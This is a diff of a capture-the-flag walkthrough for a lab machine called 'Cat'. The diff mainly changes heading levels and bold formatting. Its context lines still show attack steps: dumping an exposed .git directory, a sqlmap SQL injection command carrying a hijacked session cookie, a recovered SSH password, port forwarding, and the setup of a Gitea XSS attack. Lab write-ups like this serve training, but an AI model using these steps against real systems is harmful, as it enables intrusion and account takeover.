@@ -15,7 +15,7 @@ Cat is a medium-difficulty Linux machine that features a custom PHP web applicat
 
 This machine is ideal for intermediate users looking to improve their skills in web application exploitation, including XSS, cookie hijacking, SQL injection in SQLite, privilege escalation through log analysis, and advanced exploitation of modern web platforms like Gitea.
 
-# ENUMERATION
+## ENUMERATION
 ---
 First we run nmap to see the open ports
 
@@ -53,7 +53,7 @@ sudo vim /etc/hosts
 
 and we add the IP and the domain which in this case is `cat.htb`
 
-# FOOTHOLD
+## FOOTHOLD
 ---
 
 Now we proceed to see the page for it in the search engine we put http://cat.htb and this will appear
@@ -100,8 +100,9 @@ CTRL+C detected: Pausing threads, please wait...
 
 ```
 
-## GIT-DUMPER
+### GIT-DUMPER
 ---
+
 And we see something interesting, there is a `.git`, therefore with the `gitdumper` tool we are going to obtain all the information from that directory.
 
 ```bash
@@ -146,14 +147,14 @@ There we replace what we have received by `double-clicking` and pressing enter a
 
 Now we are admin, therefore we can perform a `SQLI via SQLMap` to obtain more information with the cookie obtained.
 
-## SQL INJECTION
+### SQL INJECTION
 ---
 
 ```bash
 sqlmap -u "http:cat.htb/accept_cat.php" data "catId=1&catName=catty" cookie="PHPSESSID=jce8bkemt9o56ut4ucipjbbov1" -p catName level=5 risk=3 dbms=SQLite
 ```
 
-`IMP: Replace the cookie`
+**IMP: Replace the cookie**
 
 ```bash
 sqlmap -u "http://cat.htb/accept_cat.php" --data "catId=1&catName=catty" --cookie="PHPSESSID=jce8bkemt9o56ut4ucipjbbov1" -p catName --level=5 --risk=3 
@@ -204,7 +205,7 @@ Seeing that all users have hashes, we can try them one by one, which is the most
 
 We entered with `Rosa` with her password `soyunaprincesarosa` via `SSH`
 
-## SHELL AS AXEL
+### SHELL AS AXEL
 ---
 
 ```bash
@@ -349,7 +350,7 @@ user.txt
 
 And here we have the first flag
 
-# PRIVILEGE ESCALATION
+## PRIVILEGE ESCALATION
 ---
 
 Now we look at the machine connections
@@ -421,7 +422,7 @@ http:localhost:3000/administrator/Employee-management/raw/branch/main/README.md.
 
 To see what is on `port 3000`,  we perform Port forwarding through `SSH`.
 
-## PORT FORWARDING VIA SSH
+### PORT FORWARDING VIA SSH
 ---
 
 ```bash
@@ -481,6 +482,7 @@ We can see that it is a `Gitea page` and if we look at the version and investiga
 ![Texto alternativo](/assets/cat/Screenshot%202025-02-03%20215120.jpg)
 
 And we create a file with the text `test`.
+
 **IMP: If you don't put anything inside, the XSS won't reach you.**
 
 ![Texto alternativo](/assets/cat/Screenshot%202025-02-03%20215234.jpg)
@@ -496,6 +498,7 @@ python3 -m http.server 8000
 ```
 
 Once done, we send the following command to our machine to send an email to jobert.
+
 **IMP: In --body, we change it after axel/(name of your repository)**
 
 ```bash
